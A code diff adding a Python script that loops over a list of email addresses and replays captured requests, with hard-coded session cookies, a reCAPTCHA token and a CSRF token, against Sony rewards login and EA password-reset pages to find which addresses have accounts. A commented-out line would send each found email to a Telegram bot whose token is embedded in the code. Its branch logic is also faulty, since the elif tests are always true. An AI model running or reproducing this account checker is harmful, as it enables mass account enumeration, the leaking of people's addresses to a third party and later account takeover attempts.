@@ -1,0 +1,85 @@
+import requests , random , json
+from requests import post, get
+openFile = open("emails.txt",'r').read().splitlines()
+
+for Enter_Email in openFile:
+    
+
+    url = "https://www.rewards.sony.com/UID-SubmitEmail"
+    head={"Accept-Encoding":"gzip, deflate, br",
+    "Accept-Language":"ar,en-US;q=0.9,en;q=0.8",
+    "Cache-Control":"max-age=0",
+    "Content-Length":"2098",
+    "Content-Type":"application/x-www-form-urlencoded",
+    "Cookie":"dwanonymous_c61325591824cf41ed2f2509de77f1c8=bcTPOizWh36oO6LtQ1lRabjLYb; dwsecuretoken_c61325591824cf41ed2f2509de77f1c8=12345; _evga_99f6={%22uuid%22:%222bbc64382e6d6bd0%22}; _sfid_39e2={%22anonymousId%22:%222bbc64382e6d6bd0%22%2C%22consents%22:[{%22consent%22:{%22purpose%22:%22Personalization%22%2C%22provider%22:%22HardCoded%22%2C%22status%22:%22Opt%20In%22}%2C%22lastUpdateTime%22:%222024-01-13T14:30:17.875Z%22%2C%22lastSentTime%22:%222024-01-13T14:30:17.992Z%22}]}; OptanonAlertBoxClosed=2024-01-13T14:30:21.043Z; __cq_dnt=0; dw_dnt=0; cqcid=bcTPOizWh36oO6LtQ1lRabjLYb; cquid=||; dwac_fc7a229be49801651a85181528=m14y-sVuEOgC_KYLwN0t2tnzuH7m5kmaO70%3D|dw-only|||USD|false|US%2FPacific|true; sid=m14y-sVuEOgC_KYLwN0t2tnzuH7m5kmaO70; dwsid=YF7ttE7cHLiiuXmhfBZKGCLzZzBtVEXKm_hOwHZSImExohp-AwiOHoovovp44TjDAxDXxrPKR_wIvLSsR1bchg==; s_fid=0E81EB3514289900-30B93C5FA44C5E11; s_cc=true; _fbp=fb.1.1705362088968.1384979983; AMCVS_F8BC36B85AA93B8B0A495DFC%40AdobeOrg=1; AMCV_F8BC36B85AA93B8B0A495DFC%40AdobeOrg=870038026%7CMCIDTS%7C19738%7CMCMID%7C78399750202919800803003928059272704486%7CMCAAMLH-1705966891%7C6%7CMCAAMB-1705966891%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1705369291s%7CNONE%7CvVersion%7C5.0.0; __cq_uuid=bcTPOizWh36oO6LtQ1lRabjLYb; __cq_seg=0~0.00!1~0.00!2~0.00!3~0.00!4~0.00!5~0.00!6~0.00!7~0.00!8~0.00!9~0.00; _abck=2FD3C26A3B85697F743DE57A187237FC~-1~YAAQDj/FUomka/WMAQAAANGYDwuDJb+7s+S5iKoX5dMwo1ztSeX88iBtYJ6VJ1hyvPc1BigX9AFAKkh2nfh7Be2J9uIynYj7bghhBQhAEAPo9D4av6Bry3YHl3fKWVH6U9btlIrETWnplSTTDVw6n+q/NpoiPugDwyJnfyxZA+i8KGWSsNcAbvV/MHM5MfSd45cplXUu6hrcQ9im0s6DMFKygff1UVMigLjBFcGxCDIwzleFuJNFbQwXMf4bIOXXaxMzws67pnAEbKWwIsNP0V/eHkybHIf+f2Q3jtjj4p8fIUYeFxqb7V6y8BtWQbngKFqSu9aKCVB3df9Fc8J1cCUQlu/74dggD3QbasranAIfu8vLS8A3fx6noaSg0KdEGGwS2IKsYDStTlKc5xT1r4snvhcxu15t3d4UFic40eAKVBKs4WlPZbqvn3ZPltNqgF1Skt12kTPFQPz84tsrSZrV8gzwWOMLqY4pBouoiHdmA6rylJ+oAfPubXnIn0/0EliJlU+fIRHNZw==~0~-1~-1; bm_sz=AAD235B543306823E362EDF4978202CD~YAAQDj/FUoqka/WMAQAAANGYDxa21z8ZTfHGwTlsjL7cIqmfFsN5JxnOOGxL4m/BUu7e/D1MMZAWMK/celPGOEa042N2eOWzwsCHUUl6sfYckJ2UQhUp9h8yY0zaMmyrhG3GrUvvpQVj00gkU21aRXtLJPWs5WuKBwEdXe2Vl1dwSEDq+o9yTxJU48Ezj6CmcJnQ4ey849AdqwUTgm93BTnkTPiOVyj7Ep2d3TdwGf16oUrEsQCX1oFOupL0Ix4QgeZpK8TKiBiWerGGx7WidGOT1PzLD9d0un6UUkD2F4vnxNR+Iy1mDcMuCG49h8CuK0a4zYj2/vIYFUesMf5VOo68jicJqhglhGKhI3R94g5v1jiVDDYtz1L77EXf2qEV9us6WeRXMYlrzUpuFzDAAA/uPJTve5fz3d8d9h0+byVuSpFoAmfCOrNgG/qurMj0CrrZwXlveNrqd9Wl/BKE61LraJAiAJopn+9kI6wb927U0lrOz/sfuciNOhlP9SiYyofyuDBd/XpPlXnQ8HcI0AkWM9nO3WjKLozWyW4PiZWKrq/zUghC~4408900~3684162; __cf_bm=LwuLBGaJXImTr0SPjJ81NLpkz5uoLQDE6HTbjwcWAG8-1705364717-1-AW7opQZJQ++pm4X080LM7O53W/NO+OL7HCMv6hSBz5UyLvRj7EGOPqS6zav/ToZ7wT0Clm/V3S6JEszKlozWjhW97nCb172Wvg2AAFo7hJ06; s_nr=1705366027440-Repeat; OptanonConsent=isGpcEnabled=0&datestamp=Tue+Jan+16+2024+03%3A47%3A07+GMT%2B0300+(%D8%A7%D9%84%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%A7%D9%84%D8%B9%D8%B1%D8%A8%D9%8A+%D8%A7%D9%84%D8%B1%D8%B3%D9%85%D9%8A)&version=202211.2.0&isIABGlobal=false&hosts=&consentId=4471e723-35e0-4809-a62c-e80f8b47d483&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0004%3A1%2CC0002%3A1%2CC0003%3A1&geolocation=SA%3B01&AwaitingReconsent=false; s_sq=%5B%5BB%5D%5D",
+    "Dnt":"1",
+    "Origin":"https://www.rewards.sony.com",
+    "Referer":"https://www.rewards.sony.com/UID-Start",
+    "Sec-Ch-Ua":'"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+    "Sec-Ch-Ua-Mobile":"?0",
+    "Sec-Ch-Ua-Platform":"Windows",
+    "Sec-Fetch-Dest":'document',
+    "Sec-Fetch-Mode":"navigate",
+    "Sec-Fetch-Site":"same-origin",
+    "Sec-Fetch-User":"?1",
+    "Upgrade-Insecure-Requests":"1",
+    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
+
+    data={
+        "dwfrm_uidloginemail_email":str(Enter_Email),
+        "g-recaptcha-response": "03AFcWeA7GaXFlBLrZlMmA2m2T72yxPS7JfTDDPrClzDyPhyCasvtYo-p002gkDiEl_K0T9B4QR_baR5YpFMR3zFvYX2OMWN31vulmzNsKmx3T6w_6WAnDzDcypNmb2QR0craHwTXroB5xsx0qanhmlM38As5oxDF8f__ZmLEcPjJDEgo5jya9MTFcHhjeWWlBV17-EU2cmORalPVaqxHO_zwPYxAhT4Ew941CAIvXTufAPEfH2bwezmkr2hXGCukxI3fonuiDWfTYsJbNu7Oxnp-nWz4P5vI66N96s531N1d9zoOoFXI9aEGgHLv_4GCUYP8xRDwcygKBFmBMEyDg9l_C89DCRBsaLUtIGbDcgGutMClxSerZ3e5WijyoDUpnEMynNfTr0dJKtxtjNi6EUh2uBouYkxYPAMkQwmL6xu1HmK-trMtX5Ofne0FkHUb3aEUn8m53KYReAG-m9atQu4sAIoqIyampRYGvTp81HNaXFfMjbSt5ncaSOmnlE7LH8VZOuKFKGSaM5gnGremxPrCYzjt_SVz37AVDqjvhvSrNeNvwBQG7p8okLdoRIJG0druUyy3CWNwv_KS_F1HeBqTJtcCN71kxalhwNQg01mJwseap_u-egfVoQzRP636XYS9D3n93Rhb_eoDc07kuPRsik8xSE4ohF7MNBnpmmLEKGvbU8HfFxiwlyGY3zy1dlS71G2iwBIWhDelLFr--pM1TlHjZoMytVrVPCY26MrrsiNChvhwFlxvxFzJtf4g0aFVaiCJ0gtBa-cfmbTFvfvd0P4uchRwiIG_SJY5Is2k8JAOLQmyN23MmfNqMQ_3DgG4PLZVvDC2cmnwVdWThX7ZlM-ikEOvkUCP-jOM8DJVaiK2WstZjYKFq_8kfaphj3DwADJLSPD0i6TXmYIMTlvCMBKQ8AOBoh3QTdku4ceuLDXzQc1O95k3XG76wlj06HmKv16rf9A-3M1YGbqFyDaRsmsmXXshNEF7mwM5_fPDDYVapo7DIqwi3XGDWETmardgZjwo-jWqMYvNDF07ExUbhnm5nn7P-g0MQaO6jfCIMFM3VsGw3fnoQCjH9BMZjf2YN5Iqb8X-NtYnz9zeTUMltqNAp8c7BsHs_ALl99RR4kVzoePQ7pp8cZjeVbH559jcJxW-EBwKXB2kaPjpn6WZT-ukCF7ZKey8Nc8ctnj7KmdMlWB3-cI7R9JQgUxoBTJkny2R9Dx4pCdoF1Y8_LfjoI6VeMMsO9fhSuMWdVjOs3EtAXQ5B3_kkgtcK22IspLhZBppcG0_ByOptwJlC5EUzL3TWtoRQTkK8EaAWqkUKZxEPfwZenScBacOR2lIwgnXEIHWGBGsgKiKddN1E-BGgsf6RgMCuBOqkgzygDfX2Jr1dh7PG68Hv-N2XGcb9lsJwfvR3Eb_iniBv4pAMMxNkhBOUDO78JLG4IF6dpGG4y5lSSWshmyKksqRoHKWdyyhwSykkgqHVB5UDl_Fxv02hSmX7LGF3UtECUwV4cCEZ4x8TDWfPqR3bFK8TnW9im-qIPP8GfDuyodveKGTZIYQGOGwoegJjkr6kKQMYPE7SFUpmybGnwnWlrUiFEDFqpLLdb26O6csgq41o1YCjzilw3itPjVefTqP6O_ffVeV0AjQnn77LsMM8hQU9h8qHWcNQlZ6IUfwAcDnUnuyliFEHkKvJbJuuOTBwhqr3iGeST8HlBA45XgTWpJweUBC1BylKRsPWveOEnjXgpIecZAcI5E31VqmKxTYtpQFkxszKpicB3oOVAKHn8O-nC0kdso96KE2iBJkd",
+        "dwfrm_uidloginemail_send": "Next",
+        "csrf_token": "XokcNYSdSB47ErmxbJNzswNcGLKU_HcMtGMcmfxaGmwqJlDTkMEzdvxd0AG-NmM962Mbp-j1p2xn-td1-zZ_pB1kFl5DLtsaizkeP9gsz6zsJyeLAkHaHrTyA_hRC_66fo_JCk1sW3Uf2IfzU78OLqH4yQX1zSZXcV_BS6Eek6cYwlNLYSY="
+    }
+
+    url_ea= str("https://signin.ea.com/p/juno/resetPassword?execution=e1181262749s2&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Finitref_replay%3Dfalse%26display%3DjunoWeb%252Flogin%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fwww.ea.com%252Flogin_check%26locale%3Den_US%26client_id%3DEADOTCOM-WEB-SERVER")
+    head1={
+        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "Accept-Encoding":"gzip, deflate, br",
+        "Accept-Language":"ar,en-US;q=0.9,en;q=0.8",
+        "Cache-Control":"max-age=0",
+        "Connection":"keep-alive",
+        "Cookie": 'JSESSIONID=0BE6A1058934A40514BF8E701DB5BC56.prdaccounts-3; ealocale=en-us; signin-cookie="4394b37f74dfa3f4"; weblastlogin=emailPassword; _nx_mpcid=a0698ce6-ddaf-4552-a9f8-7297c2b323c1; _gid=GA1.2.1538649114.1705360652; osc=U3FvczZFclhCRnNoSzYxWXpneGZhTDlrbG5jTVdLMnBINXFjSjhzNnExWENpUTJnSkpCbUFMZkZDTTVzNw._dYnzJFqzs4QdYfFd0WY8LJeEaYJanoPH9riQzKCLhs; notice_behavior=none; _ga_KJT4MPNE2K=GS1.1.1705360716.1.1.1705361532.0.0.0; bm_mi=AA51F9FBB4EB8FF17C11B72313B0D159~YAAQND/FUnX09u+MAQAA7M53DxZQZfbZpqY0outr6cwm+IlikhxQr6XNhX9Dr+xFz0gE4x1Lv6+BVYwDeLueNt30cq8t7oWkiwP5MpfXmBnLyhMAbWd1JTs4Z2yMEcobHiuYGtIzvWfR+PdSLHjMebfwWTEkHytN6mtdZeWd7qzQHNRl66Yc6uXknqfRyeAngNs/qL/9yDsPKynITkm7GRTxNru5yXRqTgB1RxPhsh5rfkZ74/u0Xo6W/NFS3gwcEGUz9McbGjAG91zEPOoPsG2dtz7adO1iVCkMhjW14oqmxkzHSsDAWzT3d2RjrA6BR4kdkXCyL6i7eMksEtjNhcneqg==~1; _gcl_au=1.1.266743851.1705361534; ak_bmsc=3B97305C28FAA9A129D5D3369A501AC4~000000000000000000000000000000~YAAQND/FUpP09u+MAQAAkNV3DxZ9V5Y8CUrFTM7r1SLwaERXKn3nFLF8UsFXt5/KHqOnxKDcK4GgNDv4KnwTVLgYPhqmQERUwdfSPmEeuRegDSOph7kN2s/4kfu3VqGwy//hJE2JV8XG+muAMrJVVL4Yfi84JR3gP/zHH0Lkrw1vtNXBlMdKBAMCctMfT8WQv/THA1Cg/IadYyycA7jo3R/e7vmh42L5GQhZVd9F6U5DQbxhpWFb1vZnhkwhD1mFNfci+tY71hBXOarOLJ4eJUQtKkXKAAA15usXapUr+eUnTFrPu3+Pw0r8Ds6Lsoebm51fj+6m057hzJB2UnQdUMEeahRWvfJ7t8IJ41erbDeiJWnAwVdVnwVq7Gxj3kO17Js0Ay4lu0Rw/g153VQavoJXG0yJKyAbeU6eZToGJTOuqMLjqUIt6tbQg8nc576NUKl+mvBiCdljubCbftmJulJQC0VKKoL7ECD0XG7K4i8ov6o5trReVMj8R+WVZcIVjI2GA5Gj9uTlEIbyN/JH++RnN9r3vsOtdXTFb1qyy5Y=; _tt_enable_cookie=1; _ttp=rvGm9sn3qGY2OwPNbkB3gPqAUvU; _fbp=fb.1.1705361535212.1949170471; bm_sv=2A186974E2EFDEE0FF2FB7CFC7213D12~YAAQND/FUlEZ9++MAQAA83N/Dxbx2VLjvYEEoS2qkqrDesWY3B0rM5SM1rU3MMi2x1XGbC+Fc6gBAzYx1/xwA6GpMJms6hcOMJDAkaVNhorBnlisLLI5shczUhoz2ZY/CjOatWx8xeM42V/PJuDhJosS8NVEbL6welNcJfoMqTBSqf4ewH1QmE1h+xxWfzZKWtMUeEeHOv9MCAa+1vfy9CEWp4n87bhbvh9hmUSQTY+eueIN3i00NGLfpnCh~1; _ga_Q3MDF068TF=GS1.1.1705360713.1.1.1705362039.51.0.0; _ga=GA1.2.339155381.1705156756; _gat=1',
+        "Dnt":"1",
+        "Host":"signin.ea.com",
+        "Referer":"https://signin.ea.com/p/juno/resetPassword?execution=e1181262749s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Finitref_replay%3Dfalse%26display%3DjunoWeb%252Flogin%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fwww.ea.com%252Flogin_check%26locale%3Den_US%26client_id%3DEADOTCOM-WEB-SERVER",
+        "Sec-Ch-Ua":'"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        "Sec-Ch-Ua-Mobile":"?0",
+        "Sec-Ch-Ua-Platform":"Windows",
+        "Sec-Fetch-Dest":"document",
+        "Sec-Fetch-Mode":"navigate",
+        "Sec-Fetch-Site":"same-origin",
+        "Sec-Fetch-User":"?1",
+        "Upgrade-Insecure-Requests":"1",
+        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
+    data1={
+        "email": str(Enter_Email),
+        "regionCode": "US",
+        "phoneNumber": "",
+        "recaptcha": "47cdyzg",
+        "thirdPartyCaptchaResponse": "",
+        "_eventId": "submit",
+        "general-error":" We couldn’t find your EA Account.",
+        "usingPhoneInput":" false"}
+    r1 = requests.get(url=url_ea, data=data1, headers=head1)
+    r = requests.post(url=url , headers=head , data=data)
+    if r.status_code==404:
+        print(str(r.text) + "Linked PlayStation *")
+        #with open('Email_Linked.txt', 'a') as file:
+        #    file.write(str(Enter_Email) + '\n')
+    elif "dwfrm_uidloginemail_send: Next":
+        print(str(r)+ f" X {Enter_Email}")
+
+    elif "Log in with your Sony account":
+        print(str(r)+ f" ! {Enter_Email}")
+        #post(f"https://api.telegram.org/bot5750883090:AAENEcXGLxyUf9PPQ0d-wCyv9UNzRYJ4-kQ/sendMessage?chat_id=-1001749325849&text=• PlayStation and EA \n Email:{Enter_Email} \n\nBy\t@Jpno'")
+
+
+    #else:print(str(r)), print(Enter_Email)
+
+    #if r1.status_code==200:
+        #print(str(r1) + "Linked EA *")
+        #with open('Email_Linked.txt', 'a') as file:
+        #    file.write(str(Enter_Email) + '\n')
+
+    #else:"EA !!"
